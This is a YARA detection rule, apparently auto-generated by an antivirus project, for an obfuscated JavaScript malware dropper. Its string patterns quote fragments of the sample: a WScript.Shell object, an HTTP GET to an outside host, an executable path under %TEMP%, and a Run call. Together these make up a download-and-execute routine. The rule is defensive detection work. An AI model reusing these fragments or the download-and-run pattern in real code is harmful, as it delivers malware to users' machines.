rule sig_20160401_423b13d104d380d07f80f1650ef3ecec {
  meta:
    description = "datamaliciousorder - file 20160401_423b13d104d380d07f80f1650ef3ecec.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "020b1294447e8c8593c2cd080119c3ec34a1d91872bf016717352c4288f0e10e"

  strings:
    $s1  = "var FiRz = function VqsCl() {return WScript[NnQyf](\"WScript\"+\".Shell\");}(), WzGoe = 11;" fullword ascii
    $s2  = "function JhQaf(VnnXyp, LvoFwq){DeJs = DeJs * 1; return VnnXyp - LvoFwq;};" fullword ascii
    $s3  = "SiTre[EzGsq](\"G\" + \"ET\", \"http://garmulewicz.pl/v4yhsa\", false);" fullword ascii
    $s4  = "if (SiTre[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function QdkGb(){return YmMt + \"\";};" fullword ascii
    $s6  = "function RrcRzh() {return FiRz[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"0y2M8BRZ7.ex\" + \"e\";};" fullword ascii
    $s7  = "function QhQrn() {return ((GsOst == true) && (GsOst == IqXc)) ? 1 : DeJs;};" fullword ascii
    $s8  = "var EmJo = new this[\"Date\"]();" fullword ascii
    $s9  = "function JtAw(){return 23;};" fullword ascii
    $s10 = "var GsOst = false;" fullword ascii
    $s11 = "IqXc = true; " fullword ascii
    $s12 = "function LsrYj(){return NnQyf;};" fullword ascii
    $s13 = "var CzoUmp = false;" fullword ascii
    $s14 = "var IqXc = false;" fullword ascii
    $s15 = "return JhQaf(TtgGve, DzWiu);" fullword ascii
    $s16 = "}while (UtpTkp);" fullword ascii
    $s17 = "function JciLn()" fullword ascii
    $s18 = "GsOst = true; " fullword ascii
    $s19 = "function WdNi(UbpKwh){FiRz[\"R\"+\"un\"](UbpKwh, DeJs, DeJs);};" fullword ascii
    $s20 = "function CdhCas(NgFz) {var AzTqv = (1, 2, 3, 4, 5, NgFz); return AzTqv;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}